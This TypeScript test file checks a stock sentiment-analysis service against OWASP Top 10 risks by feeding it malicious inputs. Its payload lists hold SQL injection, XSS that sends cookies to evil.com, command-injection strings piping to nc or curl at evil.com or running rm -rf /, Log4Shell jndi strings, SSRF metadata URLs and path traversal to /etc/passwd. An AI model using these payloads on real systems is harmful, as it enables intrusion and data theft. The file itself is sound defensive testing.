/**
 * Security Test Suite for SentimentAnalysisService
 * Tests OWASP Top 10 compliance and enterprise-grade security validation
 * Follows VFR testing standards with NO MOCK DATA - tests real security implementations
 */

import { SentimentAnalysisService } from '../SentimentAnalysisService'
import NewsAPI from '../providers/NewsAPI'
import { RedisCache } from '../../cache/RedisCache'
import SecurityValidator from '../../security/SecurityValidator'

describe('SentimentAnalysisService Security Tests', () => {
  let sentimentService: SentimentAnalysisService
  let newsAPI: NewsAPI
  let cache: RedisCache

  beforeEach(() => {
    // Reset security state between tests
    SecurityValidator.resetSecurityState()

    // Create fresh instances with real configurations
    newsAPI = new NewsAPI(process.env.NEWSAPI_KEY, 15000, false)
    cache = new RedisCache()
    sentimentService = new SentimentAnalysisService(newsAPI, cache)
  })

  afterEach(() => {
    SecurityValidator.resetSecurityState()
  })

  describe('OWASP A01: Broken Access Control', () => {
    test('should_prevent_unauthorized_access_to_sentiment_analysis', async () => {
      // Test with various unauthorized access attempts
      const unauthorizedSymbols = [
        '../admin/sentiment',
        '../../user/data',
        '/root/secrets',
        '../../../etc/passwd'
      ]

      for (const maliciousSymbol of unauthorizedSymbols) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          maliciousSymbol,
          'Technology',
          0.75
        )

        // Should reject unauthorized access attempts
        expect(result).toBeNull()
      }

      console.log('✓ Unauthorized access properly prevented')
    })

    test('should_enforce_proper_access_control_for_bulk_analysis', async () => {
      const maliciousStocks = [
        { symbol: '../admin', sector: 'Technology', baseScore: 0.5 },
        { symbol: '../../config', sector: 'Finance', baseScore: 0.6 },
        { symbol: '/etc/hosts', sector: 'Tech', baseScore: 0.7 }
      ]

      const result = await sentimentService.analyzeBulkSentimentImpact(maliciousStocks)

      // Should complete without security breaches
      expect(result.success).toBe(true)
      expect(result.data?.stockImpacts).toEqual([])

      console.log('✓ Bulk analysis access control working')
    })
  })

  describe('OWASP A02: Cryptographic Failures', () => {
    test('should_not_expose_api_keys_in_error_messages', async () => {
      // Capture console output to check for API key exposure
      const originalConsoleError = console.error
      const originalConsoleLog = console.log
      const originalConsoleWarn = console.warn
      const capturedLogs: string[] = []

      console.error = (...args: any[]) => {
        capturedLogs.push(args.join(' '))
      }
      console.log = (...args: any[]) => {
        capturedLogs.push(args.join(' '))
      }
      console.warn = (...args: any[]) => {
        capturedLogs.push(args.join(' '))
      }

      try {
        // Force error conditions to check API key exposure
        const errorNewsAPI = new NewsAPI('invalid_api_key_format', 1, false)
        const errorService = new SentimentAnalysisService(errorNewsAPI, cache)

        await errorService.analyzeStockSentimentImpact('AAPL', 'Technology', 0.75)

        // Check all logs for API key exposure
        const allLogs = capturedLogs.join(' ')
        expect(allLogs).not.toContain('invalid_api_key_format')
        expect(allLogs).not.toMatch(/[a-f0-9]{32}/) // NewsAPI key pattern
        expect(allLogs).not.toContain('api_key')
        expect(allLogs).not.toContain('secret')
        expect(allLogs).not.toContain('token')

        console.log('✓ API keys not exposed in error messages')
      } finally {
        console.error = originalConsoleError
        console.log = originalConsoleLog
        console.warn = originalConsoleWarn
      }
    })

    test('should_sanitize_cache_data_for_security', async () => {
      const testSymbol = 'AAPL'

      // Perform sentiment analysis to populate cache
      await sentimentService.analyzeStockSentimentImpact(testSymbol, 'Technology', 0.75)

      // Check that cache doesn't contain sensitive information
      const cacheKey = `sentiment:indicators:${testSymbol}`
      const cachedData = await cache.get(cacheKey)

      if (cachedData) {
        const cacheString = JSON.stringify(cachedData)
        expect(cacheString).not.toContain('api_key')
        expect(cacheString).not.toContain('secret')
        expect(cacheString).not.toContain('password')
        expect(cacheString).not.toContain('token')
      }

      console.log('✓ Cache data properly sanitized')
    })
  })

  describe('OWASP A03: Injection Attacks', () => {
    test('should_prevent_sql_injection_in_symbol_parameter', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE sentiment_data; --",
        "' UNION SELECT api_key FROM config; --",
        "'; DELETE FROM cache WHERE 1=1; --",
        "'; INSERT INTO malicious_table VALUES ('hacked'); --",
        "' OR '1'='1",
        "'; EXEC xp_cmdshell('format c:'); --",
        "admin'--",
        "'; SELECT password FROM users WHERE ''=''"
      ]

      for (const maliciousSymbol of sqlInjectionAttempts) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          maliciousSymbol,
          'Technology',
          0.75
        )

        // Should handle SQL injection attempts safely
        expect(result).toBeNull()
      }

      console.log('✓ SQL injection attempts properly prevented')
    })

    test('should_prevent_nosql_injection_in_parameters', async () => {
      const nosqlInjectionAttempts = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "function() { return true; }"}',
        '{"$regex": ".*"}',
        '{"$exists": true}',
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}'
      ]

      for (const maliciousSymbol of nosqlInjectionAttempts) {
        const indicators = await sentimentService.getSentimentIndicators(maliciousSymbol)
        expect(indicators).toBeNull()
      }

      console.log('✓ NoSQL injection attempts properly prevented')
    })

    test('should_prevent_xss_attacks_in_symbol_input', async () => {
      const xssAttempts = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(document.cookie)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '"><script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<body onload=alert("XSS")>',
        '<meta http-equiv="refresh" content="0;url=http://evil.com">',
        '<script>document.location="http://evil.com/"+document.cookie</script>'
      ]

      for (const xssPayload of xssAttempts) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          xssPayload,
          'Technology',
          0.75
        )

        expect(result).toBeNull()

        // Test bulk analysis as well
        const bulkResult = await sentimentService.analyzeBulkSentimentImpact([
          { symbol: xssPayload, sector: 'Technology', baseScore: 0.5 }
        ])

        expect(bulkResult.success).toBe(true)
        expect(bulkResult.data?.stockImpacts).toEqual([])
      }

      console.log('✓ XSS attacks properly prevented')
    })

    test('should_prevent_command_injection_attempts', async () => {
      const commandInjectionAttempts = [
        'AAPL; cat /etc/passwd',
        'AAPL && rm -rf /',
        'AAPL | nc evil.com 1234',
        'AAPL $(whoami)',
        'AAPL `id`',
        'AAPL; curl http://evil.com/steal',
        'AAPL & powershell -c "malicious command"',
        'AAPL; ping evil.com',
        'AAPL`ls -la`',
        'AAPL$(cat /etc/shadow)'
      ]

      for (const commandInjection of commandInjectionAttempts) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          commandInjection,
          'Technology',
          0.75
        )

        // Should handle command injection safely
        expect(result).toBeNull()
      }

      console.log('✓ Command injection attempts properly handled')
    })
  })

  describe('OWASP A04: Insecure Design', () => {
    test('should_implement_proper_rate_limiting_for_sentiment_analysis', async () => {
      const testSymbol = 'AAPL'

      // Test sequential requests with timing
      const startTime = Date.now()
      const promises = Array(5).fill(0).map(() =>
        sentimentService.analyzeStockSentimentImpact(testSymbol, 'Technology', 0.75)
      )

      await Promise.allSettled(promises)
      const totalTime = Date.now() - startTime

      // Should have some rate limiting delay
      expect(totalTime).toBeGreaterThan(100)

      console.log(`✓ Rate limiting enforced: ${totalTime}ms for 5 requests`)
    }, 30000)

    test('should_validate_input_parameters_comprehensively', async () => {
      const invalidInputs = [
        { symbol: null, sector: 'Technology', baseScore: 0.75 },
        { symbol: undefined, sector: 'Technology', baseScore: 0.75 },
        { symbol: '', sector: 'Technology', baseScore: 0.75 },
        { symbol: 'AAPL', sector: null, baseScore: 0.75 },
        { symbol: 'AAPL', sector: 'Technology', baseScore: null },
        { symbol: 'AAPL', sector: 'Technology', baseScore: 'invalid' },
        { symbol: 'AAPL', sector: 'Technology', baseScore: -1 },
        { symbol: 'AAPL', sector: 'Technology', baseScore: 2 }
      ]

      for (const invalidInput of invalidInputs) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          invalidInput.symbol as any,
          invalidInput.sector as any,
          invalidInput.baseScore as any
        )

        // Should handle invalid inputs gracefully
        expect(result === null || typeof result === 'object').toBe(true)
      }

      console.log('✓ Input parameter validation working')
    })

    test('should_implement_secure_caching_strategy', async () => {
      const testSymbol = 'MSFT'

      // First request should populate cache
      const firstResult = await sentimentService.analyzeStockSentimentImpact(
        testSymbol,
        'Technology',
        0.75
      )

      // Second request should use cache but not expose sensitive data
      const secondResult = await sentimentService.analyzeStockSentimentImpact(
        testSymbol,
        'Technology',
        0.75
      )

      // Check that cached data doesn't leak sensitive information
      if (firstResult && secondResult) {
        const resultString = JSON.stringify(secondResult)
        expect(resultString).not.toContain('api_key')
        expect(resultString).not.toContain('secret')
        expect(resultString).not.toContain('internal_')
      }

      console.log('✓ Secure caching strategy implemented')
    })
  })

  describe('OWASP A05: Security Misconfiguration', () => {
    test('should_not_expose_internal_configuration_details', async () => {
      const testSymbol = 'GOOGL'

      const result = await sentimentService.analyzeStockSentimentImpact(
        testSymbol,
        'Technology',
        0.75
      )

      if (result) {
        const resultString = JSON.stringify(result)
        expect(resultString).not.toContain('newsAPI')
        expect(resultString).not.toContain('cache')
        expect(resultString).not.toContain('config')
        expect(resultString).not.toContain('internal')
        expect(resultString).not.toContain('private')
      }

      console.log('✓ Internal configuration details not exposed')
    })

    test('should_handle_service_health_checks_securely', async () => {
      const healthCheck = await sentimentService.healthCheck()

      expect(healthCheck).toHaveProperty('status')
      expect(['healthy', 'unhealthy']).toContain(healthCheck.status)

      // Health check response should not expose sensitive details
      const healthString = JSON.stringify(healthCheck)
      expect(healthString).not.toContain('api_key')
      expect(healthString).not.toContain('secret')
      expect(healthString).not.toContain('password')
      expect(healthString).not.toContain('token')

      console.log('✓ Health check security working')
    })

    test('should_enforce_proper_error_handling_configuration', async () => {
      // Test with non-existent symbol to trigger error paths
      const result = await sentimentService.analyzeStockSentimentImpact(
        'NONEXISTENT',
        'Technology',
        0.75
      )

      // Should fail gracefully without exposing configuration
      expect(result).toBeNull()

      console.log('✓ Error handling configuration secure')
    })
  })

  describe('OWASP A06: Vulnerable and Outdated Components', () => {
    test('should_use_secure_communication_with_newsapi', async () => {
      const testSymbol = 'AMZN'

      // Verify that NewsAPI communication is secure
      const result = await sentimentService.analyzeStockSentimentImpact(
        testSymbol,
        'Technology',
        0.75
      )

      // Should complete without security issues (HTTPS enforced by NewsAPI)
      expect(result === null || typeof result === 'object').toBe(true)

      console.log('✓ Secure NewsAPI communication verified')
    }, 20000)

    test('should_validate_external_api_responses_for_security', async () => {
      const testSymbol = 'TSLA'

      const indicators = await sentimentService.getSentimentIndicators(testSymbol)

      if (indicators) {
        // Check that response data doesn't contain malicious properties
        expect(indicators).not.toHaveProperty('__proto__')
        expect(indicators).not.toHaveProperty('constructor')
        expect(indicators).not.toHaveProperty('prototype')
        expect(indicators).not.toHaveProperty('eval')
        expect(indicators).not.toHaveProperty('function')

        // Validate news data structure
        expect(indicators.news).toHaveProperty('symbol')
        expect(typeof indicators.news.sentiment).toBe('number')
        expect(typeof indicators.news.confidence).toBe('number')
      }

      console.log('✓ External API response validation working')
    }, 30000)
  })

  describe('OWASP A07: Identification and Authentication Failures', () => {
    test('should_not_expose_authentication_tokens_in_responses', async () => {
      const testSymbol = 'META'

      const result = await sentimentService.analyzeStockSentimentImpact(
        testSymbol,
        'Technology',
        0.75
      )

      if (result) {
        const resultString = JSON.stringify(result)
        expect(resultString).not.toContain('jwt')
        expect(resultString).not.toContain('bearer')
        expect(resultString).not.toContain('auth')
        expect(resultString).not.toContain('session')
        expect(resultString).not.toContain('cookie')
      }

      console.log('✓ Authentication tokens not exposed')
    })

    test('should_handle_authentication_failures_securely', async () => {
      // Create service with invalid authentication
      const invalidNewsAPI = new NewsAPI('', 15000, false)
      const invalidService = new SentimentAnalysisService(invalidNewsAPI, cache)

      const result = await invalidService.analyzeStockSentimentImpact(
        'AAPL',
        'Technology',
        0.75
      )

      // Should fail gracefully without exposing auth details
      expect(result).toBeNull()

      console.log('✓ Authentication failures handled securely')
    })
  })

  describe('OWASP A08: Software and Data Integrity Failures', () => {
    test('should_validate_sentiment_data_integrity', async () => {
      const testSymbol = 'NFLX'

      const result = await sentimentService.analyzeStockSentimentImpact(
        testSymbol,
        'Technology',
        0.75
      )

      if (result) {
        // Validate data integrity
        expect(result.sentimentScore.overall).toBeGreaterThanOrEqual(0)
        expect(result.sentimentScore.overall).toBeLessThanOrEqual(1)
        expect(result.sentimentScore.confidence).toBeGreaterThanOrEqual(0)
        expect(result.sentimentScore.confidence).toBeLessThanOrEqual(1)
        expect(result.adjustedScore).toBeGreaterThanOrEqual(0)
        expect(result.adjustedScore).toBeLessThanOrEqual(1)
        expect(result.sentimentWeight).toBe(0.10) // Should be exactly 10%
        expect(Array.isArray(result.insights)).toBe(true)
      }

      console.log('✓ Sentiment data integrity validated')
    }, 30000)

    test('should_prevent_data_tampering_in_bulk_analysis', async () => {
      const testStocks = [
        { symbol: 'AAPL', sector: 'Technology', baseScore: 0.75 },
        { symbol: 'MSFT', sector: 'Technology', baseScore: 0.80 },
        { symbol: 'GOOGL', sector: 'Technology', baseScore: 0.70 }
      ]

      const result = await sentimentService.analyzeBulkSentimentImpact(testStocks)

      if (result.success && result.data) {
        // Validate bulk data integrity
        expect(Array.isArray(result.data.stockImpacts)).toBe(true)

        result.data.stockImpacts.forEach(impact => {
          expect(impact.sentimentWeight).toBe(0.10)
          expect(impact.adjustedScore).toBeGreaterThanOrEqual(0)
          expect(impact.adjustedScore).toBeLessThanOrEqual(1)
        })
      }

      console.log('✓ Bulk analysis data tampering prevention working')
    }, 45000)
  })

  describe('OWASP A09: Security Logging and Monitoring Failures', () => {
    test('should_implement_secure_logging_practices', async () => {
      const originalConsoleLog = console.log
      const originalConsoleError = console.error
      const logEntries: string[] = []

      console.log = (...args: any[]) => {
        logEntries.push(args.join(' '))
        originalConsoleLog(...args)
      }
      console.error = (...args: any[]) => {
        logEntries.push(args.join(' '))
        originalConsoleError(...args)
      }

      try {
        await sentimentService.analyzeStockSentimentImpact('AAPL', 'Technology', 0.75)

        // Check that logs don't contain sensitive information
        const allLogs = logEntries.join(' ')
        expect(allLogs).not.toMatch(/[a-f0-9]{32}/) // API keys
        expect(allLogs).not.toContain('secret')
        expect(allLogs).not.toContain('password')
        expect(allLogs).not.toContain('token')

        console.log('✓ Secure logging practices implemented')
      } finally {
        console.log = originalConsoleLog
        console.error = originalConsoleError
      }
    })

    test('should_monitor_suspicious_activity_patterns', async () => {
      const suspiciousSymbols = [
        '<script>alert(1)</script>',
        '../../../etc/passwd',
        '; DROP TABLE users; --',
        '${jndi:ldap://evil.com/a}'
      ]

      // Test multiple suspicious requests
      for (const suspiciousSymbol of suspiciousSymbols) {
        await sentimentService.analyzeStockSentimentImpact(
          suspiciousSymbol,
          'Technology',
          0.75
        )
      }

      // Security monitoring should handle these gracefully
      const securityStatus = SecurityValidator.getSecurityStatus()
      expect(typeof securityStatus).toBe('object')

      console.log('✓ Suspicious activity monitoring working')
    })
  })

  describe('OWASP A10: Server-Side Request Forgery (SSRF)', () => {
    test('should_prevent_ssrf_attacks_through_symbol_parameter', async () => {
      const ssrfAttempts = [
        'http://localhost:22',
        'https://169.254.169.254/metadata',
        'file:///etc/passwd',
        'ftp://internal.company.com',
        'gopher://127.0.0.1:25',
        'http://10.0.0.1/admin',
        'https://127.0.0.1:8080/admin'
      ]

      for (const ssrfAttempt of ssrfAttempts) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          ssrfAttempt,
          'Technology',
          0.75
        )

        // Should reject SSRF attempts
        expect(result).toBeNull()
      }

      console.log('✓ SSRF attacks properly prevented')
    })

    test('should_validate_url_schemes_in_newsapi_integration', async () => {
      // Test legitimate symbol to verify normal operation
      const legitimateResult = await sentimentService.analyzeStockSentimentImpact(
        'AAPL',
        'Technology',
        0.75
      )

      // Should work with legitimate symbols (or return null if no news)
      expect(legitimateResult === null || typeof legitimateResult === 'object').toBe(true)

      console.log('✓ URL scheme validation working')
    }, 20000)
  })

  describe('Real-World Attack Scenarios', () => {
    test('should_handle_combined_attack_vectors', async () => {
      const combinedAttacks = [
        '<script>fetch("http://evil.com/"+document.cookie)</script>',
        '\'; DROP TABLE users; --<img src=x onerror=alert(1)>',
        '../../../etc/passwd?param=<script>alert(1)</script>',
        '${jndi:ldap://evil.com/a}"; DELETE FROM cache; --'
      ]

      for (const combinedAttack of combinedAttacks) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          combinedAttack,
          'Technology',
          0.75
        )

        expect(result).toBeNull()
      }

      console.log('✓ Combined attack vectors properly handled')
    })

    test('should_maintain_security_under_high_concurrent_load', async () => {
      const symbols = ['AAPL', 'MSFT', 'GOOGL', 'AMZN', 'TSLA']
      const maliciousInputs = [
        '<script>alert(1)</script>',
        '; DROP TABLE users; --',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ]

      // Mix legitimate and malicious requests
      const allRequests = [
        ...symbols.map(symbol =>
          sentimentService.analyzeStockSentimentImpact(symbol, 'Technology', 0.75)
        ),
        ...maliciousInputs.map(input =>
          sentimentService.analyzeStockSentimentImpact(input, 'Technology', 0.75)
        )
      ]

      const results = await Promise.allSettled(allRequests)

      // All requests should complete without throwing errors
      results.forEach(result => {
        expect(['fulfilled', 'rejected']).toContain(result.status)
      })

      // Security state should remain stable
      const securityStatus = SecurityValidator.getSecurityStatus()
      expect(typeof securityStatus).toBe('object')

      console.log(`✓ Security maintained under load: ${results.length} concurrent requests`)
    }, 90000)

    test('should_validate_legitimate_stock_symbols_correctly', async () => {
      const legitimateSymbols = [
        'aapl',      // lowercase
        'AAPL ',     // with trailing space
        ' MSFT',     // with leading space
        'GOOGL\t',   // with tab
        'AMZN\n',    // with newline
        'TSLA\r',    // with carriage return
        '  META  '   // with multiple spaces
      ]

      for (const symbol of legitimateSymbols) {
        // These should be sanitized and processed, not rejected
        const result = await sentimentService.analyzeStockSentimentImpact(
          symbol,
          'Technology',
          0.75
        )

        // Should either return data or null (not throw errors)
        expect(result === null || typeof result === 'object').toBe(true)
      }

      console.log('✓ Legitimate symbols properly validated and processed')
    })

    test('should_handle_edge_case_inputs_securely', async () => {
      const edgeCases = [
        '',           // empty string
        ' ',          // space only
        '\t',         // tab only
        '\n',         // newline only
        '\r',         // carriage return only
        '\0',         // null byte
        'A'.repeat(1000), // very long string
        '🚀📈💰',      // emojis
        'AAPL\x00',   // null byte injection
        'AAPL\uFEFF'  // BOM character
      ]

      for (const edgeCase of edgeCases) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          edgeCase,
          'Technology',
          0.75
        )

        // Should handle edge cases gracefully
        expect(result === null || typeof result === 'object').toBe(true)
      }

      console.log('✓ Edge case inputs handled securely')
    })
  })

  describe('Error Message Security', () => {
    test('should_sanitize_error_messages_for_production_security', async () => {
      const originalNodeEnv = process.env.NODE_ENV
      process.env.NODE_ENV = 'production'

      try {
        // Force error with invalid API configuration
        const errorNewsAPI = new NewsAPI('', 1, false)
        const errorService = new SentimentAnalysisService(errorNewsAPI, cache)

        // Capture error output
        const originalConsoleError = console.error
        const capturedErrors: string[] = []

        console.error = (...args: any[]) => {
          capturedErrors.push(args.join(' '))
        }

        try {
          await errorService.analyzeStockSentimentImpact('AAPL', 'Technology', 0.75)

          // Check error message sanitization
          const allErrors = capturedErrors.join(' ')
          expect(allErrors).not.toContain('api_key')
          expect(allErrors).not.toContain('secret')
          expect(allErrors).not.toContain('password')
          expect(allErrors).not.toContain('database')
          expect(allErrors).not.toContain('mongodb://')

          console.log('✓ Production error message sanitization working')
        } finally {
          console.error = originalConsoleError
        }
      } finally {
        process.env.NODE_ENV = originalNodeEnv
      }
    })
  })
})